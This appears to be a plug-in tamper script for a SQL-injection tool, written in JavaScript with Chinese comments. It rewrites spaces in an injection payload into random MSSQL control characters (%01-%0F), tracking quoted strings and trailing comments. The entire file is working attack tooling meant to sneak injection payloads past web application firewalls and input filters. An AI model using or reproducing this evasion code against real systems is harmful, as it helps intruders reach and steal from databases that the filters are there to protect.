//@name: 空格转MSSQL控制符
//@usage: payload
//@enable: false
//@description: 空格→随机MSSQL控制符%01-%0F（引号感知，注释段后不含%0A）
function tamper(payload){
    if (!payload) { return payload; }
    var blanks = ['%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A'];
    var retVal = '', quote = false, dquote = false, firstspace = false, end = false;
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        if (!firstspace){
            if (/\s/.test(c)){ firstspace = true; retVal += blanks[Math.floor(Math.random() * blanks.length)]; continue; }
        } else if (c === "'" && payload.charAt(i - 1) !== '\\'){ quote = !quote; }
        else if (c === '"' && payload.charAt(i - 1) !== '\\'){ dquote = !dquote; }
            else if (c === '#' || payload.substr(i, 3) === '-- '){ end = true; }
            else if (c === ' ' && !dquote && !quote){
                retVal += blanks[Math.floor(Math.random() * (end ? blanks.length - 1 : blanks.length))]; continue;
            }        retVal += c;
    }
    return retVal;
}